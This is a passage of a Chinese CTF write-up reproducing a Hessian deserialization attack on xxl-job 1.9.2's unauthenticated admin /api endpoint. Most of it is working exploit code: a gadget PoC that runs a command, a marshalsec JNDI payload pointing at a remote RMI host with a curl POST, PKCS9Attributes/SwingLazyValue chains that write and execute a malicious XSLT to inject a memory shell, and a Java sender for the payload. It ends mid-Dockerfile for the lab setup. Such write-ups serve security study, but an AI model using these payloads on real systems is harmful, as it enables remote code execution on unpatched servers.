class="hljs-keyword">protected</span> IOException <span class="hljs-title function_">expect</span><span class="hljs-params">(String expect, <span class="hljs-type">int</span> ch)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>  &#123;<br>    <span class="hljs-keyword">if</span> (ch &lt; <span class="hljs-number">0</span>)<br>      <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect + <span class="hljs-string">&quot; at end of file&quot;</span>);<br>    <span class="hljs-keyword">else</span> &#123;<br>      _offset--;<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> _offset;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">context</span><br>          <span class="hljs-operator">=</span> buildDebugContext(_buffer, <span class="hljs-number">0</span>, _length, offset);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> readObject();<br><br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>)<br>                       + <span class="hljs-string">&quot; &quot;</span> + obj.getClass().getName() + <span class="hljs-string">&quot; (&quot;</span> + obj + <span class="hljs-string">&quot;)&quot;</span><br>                       + <span class="hljs-string">&quot;\n  &quot;</span> + context + <span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>          <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                       + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>) + <span class="hljs-string">&quot; null&quot;</span>);<br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        log.log(Level.FINE, e.toString(), e);<br><br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;expected &quot;</span> + expect<br>                     + <span class="hljs-string">&quot; at 0x&quot;</span> + Integer.toHexString(ch &amp; <span class="hljs-number">0xff</span>));<br>      &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>可以看到接受了一个expect的String类型变量，然后调用readObject方法获取了一个对象，再直接将expect和obj对象拼接起来，从而触发了该对象的toString方法</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>去找一下expect方法的引用</p><p><img src="https://cdn.clown2024.cn/image-20241126230631856.png" alt="image-20241126230631856"></p><p>可以找到大部分的read方法都可以调用expect方法，文章选择的是readString，那这里也跟着readString来</p><p>然后也是通过查找引用的方式找readString的调用，这里引用readString的方法也很多，所以面向结果查找（</p><p>完整的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Hessian2Input#readObject --&gt; Hessian2Input#readObjectDefinition --&gt; Hessian2Input#readString --&gt; Hessian2Input#expect<br></code></pre></td></tr></table></figure><p>然后是分析触发的点</p><p>首先是readObject方法中，他会读取第一个字节数据来进行判断</p><p><img src="https://cdn.clown2024.cn/image-20241126231943276.png" alt="image-20241126231943276"></p><p>然后如果第一个字节为大写C即byte为67的话，就会调用readObjectDefinition方法</p><p><img src="https://cdn.clown2024.cn/image-20241126232117755.png" alt="image-20241126232117755"></p><p>然后里面就会调用readString方法</p><p><img src="https://cdn.clown2024.cn/image-20241126232145954.png" alt="image-20241126232145954"></p><p>然后readString也是读取字节来进行判断</p><p><img src="https://cdn.clown2024.cn/image-20241126232608979.png" alt="image-20241126232608979"></p><p>但是我们写入的是对象类型，所以也不用考虑他读取的第二个tag，最终一定会走到default里面触发expect</p><p><img src="https://cdn.clown2024.cn/image-20241126232816146.png" alt="image-20241126232816146"></p><h3 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h3><p>那现在我们需要考虑的是如何控制第一个字节，可以使用<strong>System.arraycopy</strong>方法，该方法是java中用来复制数组元素的方法</p><p>写一个Person类里面的toString方法有恶意代码来简单测试</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">expectExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;Hessian异常toString成功捏o(=•ェ•=)m&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(person);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br>        Hessian2_Deserial(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://cdn.clown2024.cn/image-20241126234432399.png" alt="image-20241126234432399"></p><h1 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h1><p>题目就是一个xxl-job的1.9.2的版本，版本挺低的，一个xxl-job的总结，大部分wp都是看这个的：<a href="https://xz.aliyun.com/t/13899">https://xz.aliyun.com/t/13899</a></p><p>总结就是xxl-job一般有两个打法，一个是打api未授权，一个是打executor未授权，该题打的就是api未授权访问</p><h2 id="api未授权打法"><a href="#api未授权打法" class="headerlink" title="api未授权打法"></a>api未授权打法</h2><p>api未授权，是针对admin组件的，访问api的时候会返回这样的内容，证明这是存在api未授权</p><p><img src="https://cdn.clown2024.cn/image-20241127000028369.png" alt="image-20241127000028369"></p><p>可以去看看xxl-job-admin的源码下的api路由都是干什么的</p><p><img src="https://cdn.clown2024.cn/image-20241127000743175.png" alt="image-20241127000743175"></p><p>可以看到他会调用doInvoke方法，然后直接将body全部都反序列化了</p><h3 id="打jndi注入"><a href="#打jndi注入" class="headerlink" title="打jndi注入"></a>打jndi注入</h3><p>然后就可以直接利用jndi，用marshalsec生成exp去打</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringAbstractBeanFactoryPointcutAdvisor rmi://x.x.x.x:1099/aaa &gt; test.ser<br></code></pre></td></tr></table></figure><p>用的是SpringAbstractBeanFactoryPointcutAdvisor这条链子</p><p>然后利用curl去发包即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -XPOST -H <span class="hljs-string">&quot;Content-Type: x-application/hessian&quot;</span> --data-binary @test.ser http://127.0.0.1:8080/api<br></code></pre></td></tr></table></figure><p>但是这种打法需要环境出网，这里题目是不出网的，所以需要换一种方式去打内存马</p><h3 id="xslt打内存马"><a href="#xslt打内存马" class="headerlink" title="xslt打内存马"></a>xslt打内存马</h3><p>XSLT（eXtensible Stylesheet Language Transformations，可扩展样式表语言转换）是一种用于转换XML文档的编程语言。XSLT定义了如何将一个XML文档转换成另一种格式，比如HTML、文本或者另一个XML文档。</p><p>这部分的利用在Nookipop师傅的文章中有说，里面一些Hessian的链子没见过，还临时去补了一下</p><p>因为不出网就需要打内存马，我们这里需要打两次payload，第一次写入xslt文件，第二次解析xslt文件打入内存马</p><p>先利用Hessian的PKCS9Attributes这条原生链子写一个xslt文件能够执行任意代码</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9可以换成MimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="hljs-string">&quot;_main&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, <span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>&#125;&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里最后调用的静态方法是Process#_main方法，该方法能够解析xslt文件</p><p>能够执行任意代码的恶意xslt文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;base64&#x27;)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cl&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;th:getContextClassLoader(th:currentThread())&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rce&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ru:defineClass(&#x27;classname&#x27;,$bs,$cl)&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$rce&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后我们还需要一个用来写入的静态方法，选用JavaUtils的writeBytesTofilename</p><p><img src="https://cdn.clown2024.cn/image-20241127211222432.png" alt="image-20241127211222432"></p><p>那就可以得到另一个payload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javasec.pocs.hessian;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.javasec.utils.SerializeUtils;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianProxyLVFileWrite</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9可以换成MimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑</span><br>        <span class="hljs-comment">//去修改需要读取的文件，和写入的文件名，实例中是读取1.txt写入pwned.txt</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>,SerializeUtils.getFileBytes(<span class="hljs-string">&quot;E:\\payload.xslt&quot;</span>)&#125;));<br>        SerializeUtils.setFieldValue(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;poc.ser&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOut);<br>        fileOut.write(<span class="hljs-number">67</span>);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(pkcs9Attributes);<br>        out.close();<br>        fileOut.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后这里写一个exp能够序列化payload并发送post请求的</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.exp;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attribute;<br><span class="hljs-keyword">import</span> sun.security.pkcs.PKCS9Attributes;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DasCTFEasyJob</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] Hessian2_Serial(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(baos);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(o);<br>        hessian2Output.flushBuffer();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">Hessian2_Deserial</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> o.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(o, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Pkcs9可以换成MimeTypeParameterList</span><br>        <span class="hljs-type">PKCS9Attributes</span> <span class="hljs-variable">pkcs9Attributes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attributes</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PKCS9Attribute</span>[]&#123;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-comment">//去修改这里写入的文件名，以及文件内容</span><br>        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;/tmp/1.xslt&quot;</span>, Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;payload.xslt&quot;</span>))&#125;));<br>        setField(pkcs9Attributes,<span class="hljs-string">&quot;attributes&quot;</span>,uiDefaults);<br>        <span class="hljs-type">byte</span>[] data = Hessian2_Serial(pkcs9Attributes);<br><br>        <span class="hljs-type">byte</span>[] poc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[data.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>&#125;, <span class="hljs-number">0</span>, poc, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">//先将第一个字节复制为67</span><br>        System.arraycopy(data, <span class="hljs-number">0</span>, poc, <span class="hljs-number">1</span>, data.length); <span class="hljs-comment">//然后将data复制到后面</span><br><span class="hljs-comment">//        Hessian2_Deserial(poc);</span><br>        <span class="hljs-comment">//发送post请求，因为Hessian要发送原生的序列化数据</span><br>        <span class="hljs-comment">//创建url对象</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8080/api&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        <span class="hljs-comment">// 设置请求方法为 POST</span><br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        <span class="hljs-comment">// 设置请求头</span><br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        <span class="hljs-comment">// 允许输出</span><br>        connection.setDoOutput(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//设置请求体</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> connection.getOutputStream();<br>        outputStream.write(poc);<br>        <span class="hljs-comment">// 获取响应码</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br>        <span class="hljs-comment">// 关闭连接</span><br>        connection.disconnect();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241127214635292.png" alt="image-20241127214635292"></p><blockquote><p>欸我服了打了几次没反应，看了一下容器日志，说java.lang.ClassNotFoundException: sun.swing.SwingLazyValue，怪了，我看了一下admin组件的java版本</p><p>我去怎么是jdk21的版本的😓，这Tomcat镜像直接给我拉了一个21的jdk，那就改一下admin的dockerfile，改成手动装tomcat和jdk了</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># 使用官方Java镜像作为基础镜像</span><br><span class="hljs-keyword">FROM</span> dockerpull.org/openjdk:<span class="hljs-number">8</span>-jdk<br><br><span class="hljs-comment"># 设置环境变量</span><br><span class="hljs-keyword">ENV</span> TOMCAT_WEBAPPS /usr/local/tomcat/webapps<br><span class="hljs-keyword">ENV</span> TIME_ZONE Asia/Shanghai<br><br><span class="hljs-comment"># 安装Tomcat</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> wget https://downloads.apache.org/tomcat/tomcat-9/v9.0.97/bin/apache-tomcat-9.0.97.tar.gz -O /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; tar -xzf /tmp/tomcat.tar.gz -C /usr/local \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> /tmp/tomcat.tar.gz \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">ln</span> -s /usr/local/apache-tomcat-9.0.97 /usr/local/tomcat</span><br><br><span class="hljs-comment"># 清理默认的Tomcat应用</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/* <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/docs <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/examples <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/host-manager <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/manager</span><br><br><span class="hljs-comment"># 设置时区</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">ln</span> -snf /usr/share/zoneinfo/<span class="hljs-variable">$TIME_ZONE</span> /etc/localtime &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TIME_ZONE</span> &gt; /etc/timezone</span><br><br><span class="hljs-comment"># 添加你的应用到Tomcat的webapps目录</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> ./xxl-job-admin-1.9.2 <span class="hljs-variable">$TOMCAT_WEBAPPS</span>/ROOT/</span><br><br><span class="hljs-comment"># 清理临时文件</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -rf /tmp/*</span><br><br><span class="hljs-comment"># 暴露Tomcat的端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br><br><span class="hljs-comment"># 启动Tomcat</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> /usr/local/tomcat/bin/startup.sh &amp;&amp; <span class="hljs-built_in">tail</span> -F 